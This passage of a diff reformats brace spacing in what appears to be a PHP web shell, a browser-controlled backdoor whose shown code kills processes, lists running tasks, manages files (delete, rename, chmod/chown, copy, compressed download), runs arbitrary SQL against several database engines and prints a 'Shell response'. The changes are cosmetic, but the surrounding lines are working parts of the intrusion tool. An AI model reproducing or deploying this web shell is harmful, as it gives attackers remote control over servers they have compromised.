+if (isset($p['me']) && $p['me'] === 'process'){
+	if (isset($p['ps'])){
+        for ($i = 0; count($p['ps']) > $i; $i++){
 			if (function_exists('posix_kill')) 
 				$sBuff .= sDialog((posix_kill($p['ps'][$i], '9') ? 'Process with pid ' . $p['ps'][$i] . ' has been successfully killed' : 'Unable to kill process with pid ' . $p['ps'][$i]));
 			else {
@@ -1975,7 +1973,7 @@ if (isset($p['me']) && $p['me'] === 'process') {
 
 	$h = 'ps aux';
 	$wexp = ' ';
-	if ($isWIN) {
+	if ($isWIN){
 		$h = 'tasklist /V /FO csv';
 		$wexp = '","';
 	}
@@ -2065,34 +2063,34 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 	n=1;function p(a){b=h;a||(a=((this.ownerDocument||this.document||this).parentWindow||window).event,a.preventDefault=q,a.stopPropagation=r);c=this.b[a.type],e;for(e in c)this.h=c[e],this.h(a)===j&&(b=j);return b}function q(){this.returnValue=j}function r(){this.cancelBubble=h}Array.forEach||(Array.forEach=function(a,b,c){for(e=0;e<a.length;e++)b.call(c,a[e],e,a)});
 	Function.prototype.forEach=function(a,b,c){for(e in a)"undefined"==typeof this.prototype[e]&&b.call(c,a[e],e,a)};String.forEach=function(a,b,c){Array.forEach(a.split(""),function(e,g){b.call(c,e,g,a)})};function l(a,b){if(a){c=Object;if(a instanceof Function)c=Function;else{if(a.forEach instanceof Function){a.forEach(b,void 0);return}"string"==typeof a?c=String:"number"==typeof a.length&&(c=Array)}c.forEach(a,b,void 0)}};
 
-	function append(e, c) {
+	function append(e, c){
 		o = d.getElementById(e);
 		if (o) o.innerHTML += c;
 	}
 	
-	function appendr(e, c) {
+	function appendr(e, c){
 		o = d.getElementById(e);
 		if (o) o.innerHTML = c + o.innerHTML;
 	}
 
-	function remove(e) {
+	function remove(e){
 		o = d.getElementById(e);
 		if (o) o.parentNode.removeChild(o);
 	}
 
-	function empty(e) {
+	function empty(e){
 		o = d.getElementById(e);
 		if (o) o.innerHTML = null;
 	}
 	
-	function serialize(form) {
+	function serialize(form){
 		var i, j, q = [];
 		if (!form || form.nodeName !== "FORM") return;
-		for (i = form.elements.length - 1; i >= 0; i = i - 1) {
+		for (i = form.elements.length - 1; i >= 0; i = i - 1){
 			if (form.elements[i].name === "") continue;
-			switch (form.elements[i].nodeName) {
+			switch (form.elements[i].nodeName){
 				case 'INPUT':
-					switch (form.elements[i].type) {
+					switch (form.elements[i].type){
 						case 'text':
 						case 'hidden':
 						case 'password':
@@ -2113,19 +2111,19 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 					q.push(form.elements[i].name + "=" + euc(form.elements[i].value));
 					break;
 				case 'SELECT':
-					switch (form.elements[i].type) {
+					switch (form.elements[i].type){
 						case 'select-one':
 							q.push(form.elements[i].name + "=" + euc(form.elements[i].value));
 							break;
 						case 'select-multiple':
-							for (j = form.elements[i].options.length - 1; j >= 0; j = j - 1) {
+							for (j = form.elements[i].options.length - 1; j >= 0; j = j - 1){
 								if (form.elements[i].options[j].selected) q.push(form.elements[i].name + "=" + euc(form.elements[i].options[j].value));
 							}
 							break;
 					}
 					break;
 				case 'BUTTON':
-					switch (form.elements[i].type) {
+					switch (form.elements[i].type){
 						case 'reset':
 						case 'submit':
 						case 'button':
@@ -2138,20 +2136,20 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 		return q.join("&");
 	}
 	
-	function ajax(p, cf) {
+	function ajax(p, cf){
 		var ao = {};
 		lastAjax = p;
 		ao.cf = cf;
 		ao.request = new XMLHttpRequest();
-		ao.bindFunction = function (caller, object) {
-			return function () {
+		ao.bindFunction = function (caller, object){
+			return function (){
 				return caller.apply(object, [object]);
 			};
 		};
-		ao.stateChange = function (object) {
+		ao.stateChange = function (object){
 			if (ao.request.readyState == 4) ao.cf(ao.request.responseText);
 		};
-		if (window.XMLHttpRequest) {
+		if (window.XMLHttpRequest){
 			req = ao.request;
 			req.onreadystatechange = ao.bindFunction(ao.stateChange, ao);
 			req.open("POST", targeturl, true);
@@ -2185,7 +2183,7 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 	function drag_start(){
 		if(!onDrag){
 			onDrag = true;
-			//d.removeEventListener("mousemove", function(e) {}, false);
+			//d.removeEventListener("mousemove", function(e){}, false);
 			d.addEventListener("mousemove", function(e){
 				dragX = e.pageX;
 				dragY = e.pageY;
@@ -2195,7 +2193,7 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 	}
 
 	function drag_loop(){
-		if (onDrag) {
+		if (onDrag){
 			x = dragX - dragDeltaX;
 			y = dragY - dragDeltaY;
 			if (x < 0) x = 0;
@@ -2209,10 +2207,10 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 
 	function drag_stop(){
 		onDrag = false;
-		//d.removeEventListener("mousemove", function(e) {}, false);
+		//d.removeEventListener("mousemove", function(e){}, false);
 	}
 
-	function show_box(t, ct) {
+	function show_box(t, ct){
 		hide_box();
 		box = "<div id='box' class='box'><p id='boxtitle' class='boxtitle'>"+t+"<span onclick='hide_box();' class='boxclose floatRight'>x</span></p><div class='boxcontent'>"+ct+"</div></div>";
 		append("content", box);
@@ -2227,13 +2225,13 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 		o.left = x + "px";
 		o.top = y + "px";
 			
-		d.addEventListener("keyup", function (e) {
+		d.addEventListener("keyup", function (e){
 			if (e.keyCode === 27) hide_box();
 		});
 		
-		d.getElementById("boxtitle").addEventListener("click", function(e) {
+		d.getElementById("boxtitle").addEventListener("click", function(e){
 			e.preventDefault();
-			if (!onDrag) {		
+			if (!onDrag){		
 				dragDeltaX = e.pageX - parseInt(o.left);
 				dragDeltaY = e.pageY - parseInt(o.top);
 				drag_start();
@@ -2245,7 +2243,7 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 
 	function hide_box(){
 		onDrag = false;
-		//d.removeEventListener("keyup", function(e) {}, false);
+		//d.removeEventListener("keyup", function(e){}, false);
 		remove("box");
 		remove("dlf");
 	}
@@ -2296,20 +2294,20 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 		text = "<?php echo tText('name', 'Name'); ?>";
 		btitle = "<?php echo tText('go', 'Go!'); ?>";
 
-		if (a === "del") {
+		if (a === "del"){
 			disabled = "disabled";
 			title = "<?php echo tText('del', 'Del'); ?>";
-		} else if (a === "ren") {
+		} else if (a === "ren"){
 			title = "<?php echo tText('rname', 'Rename'); ?>";
-		} else if (a === "mpers") {
+		} else if (a === "mpers"){
 			path = o.innerHTML.substring(17, 21);
 			title = "<?php echo tText('chmodchown', 'Chmod/Chown'); ?>";
 			text = title.substring(0, 5);
-		} else if (a === "mdate") {
+		} else if (a === "mdate"){
 			path = o.innerHTML;
 			title = "<?php echo tText('date', 'Date'); ?>";
 			text = title;
-		} else if ((a === "cdir") || (a === "cfile")) {
+		} else if ((a === "cdir") || (a === "cfile")){
 			path = "";
 			datapath = d.getElementById("base").value;
 			title = "<?php echo tText('createdir', 'Create directory'); ?>";
@@ -2327,13 +2325,13 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 		s = serialize(d.forms[0]).replace(/chkall=&/g, "");
 		s = s.substring(0, s.indexOf("&goui=")); 
 
-		if (a === "comp") {
+		if (a === "comp"){
 			title = "<?php echo tText('download', 'Download'); ?>";
-		} else if (a === "copy") {
+		} else if (a === "copy"){
 			title = "<?php echo tText('copy', 'Copy'); ?>";
 			uival = "<tr><td class='colFit'><?php echo tText('to', 'To') ?></td><td><input id='uival' name='uival' type='text' value=''></td></tr>";
 			n = "d.getElementById(&quot;uival&quot;).value";
-		} else if (a === "rdel") {
+		} else if (a === "rdel"){
 			title = "<?php echo tText('del', 'Del'); ?>";
 		}
 
@@ -2343,7 +2341,7 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 	}
 	
 	function processUI(a, o, n){
-		if (a === "comp") {
+		if (a === "comp"){
 			hide_box();
 			append("content", "<iframe id='dlf' class='hide' src='" + targeturl + "?me=file&md=tools&ac=comp&" + o + "'></iframe>");
 		} else {
@@ -2351,7 +2349,7 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 			if (a !== "copy" && a !== "rdel") o = euc(o);
 			if (a === "ren") n = d.getElementById("base").value + n;
 			ajax("me=file&md=tools&ac=" + a + "&a=" + o + "&b=" + euc(n), function(r){
-				if (r === "OK") {
+				if (r === "OK"){
 					hide_box();
 					ajaxLoad(lastLoad);
 				} else append("box", "<div class='boxresult'>" + r + "</div>");
@@ -2369,14 +2367,14 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 		show_box("<?php echo tText('upload', 'Upload'); ?>", ct);
 	}
 	
-	function uiupdate(t) {
+	function uiupdate(t){
 		ajax(serialize(d.forms[t]), function(r){
 			//remove("uires");
 			appendr("content", "<div id='uires' class='uires'><?php echo tText('sres', 'Shell response'); ?>: " + r + "</div>");
 		});
 	}
 
-	function dbexec(c) {
+	function dbexec(c){
 		empty("dbRes");
 		append("dbRes", "<div class='loading'></div>");
 		ajax(serialize(d.forms[0]) + '&sqlcode=' + c, function(r){
@@ -2386,16 +2384,16 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 		});
 	}	
 	
-	function dbengine(t) {
+	function dbengine(t){
 		d.getElementById("su").className = "hide";
 		d.getElementById("sp").className = "hide";
 		d.getElementById("so").className = "hide";
 		
-		if ((t.value === "odbc") || (t.value === "pdo")) {
+		if ((t.value === "odbc") || (t.value === "pdo")){
 			d.getElementById("sh").innerHTML = "<?php echo tText('sq5', 'DSN/Connection String'); ?>";
 			d.getElementById("su").className = "";
 			d.getElementById("sp").className = "";
-		} else if ((t.value === "sqlite") || (t.value === "sqlite3")) {
+		} else if ((t.value === "sqlite") || (t.value === "sqlite3")){
 			d.getElementById("sh").innerHTML = "<?php echo tText('sq6', 'DB File'); ?>";
 		} else {
 			d.getElementById("sh").innerHTML = "<?php echo tText('sq7', 'Host'); ?>";
@@ -2405,8 +2403,8 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 		}
 	}
 	
-	function CheckAll(form) {
-		for(i = 0; i < form.elements.length; i++) {
+	function CheckAll(form){
+		for(i = 0; i < form.elements.length; i++){
 			e = form.elements[i];
 			if (e.name != "chkall") e.checked = form.chkall.checked;
 		}
@@ -2750,7 +2748,7 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 							$i = 0;
 							$countMenu = count($CCCPmod);
 							$sysMenu = '<a href="#" onclick="ajaxLoad(\'me=file\');"><b>' . tText('fm', 'File Manager') . '</b></a> | ';
-							while ($i < $countMenu) {
+							while ($i < $countMenu){
 								$sysMenu .= '<a href="#" onclick="ajaxLoad(\'me=' . $CCCPmod[$i] . '\');"><b>' . $CCCPtitle[$i] . '</b></a>' . ($i == $countMenu ? '' : ' | ');
 								$i++;
 							}			 
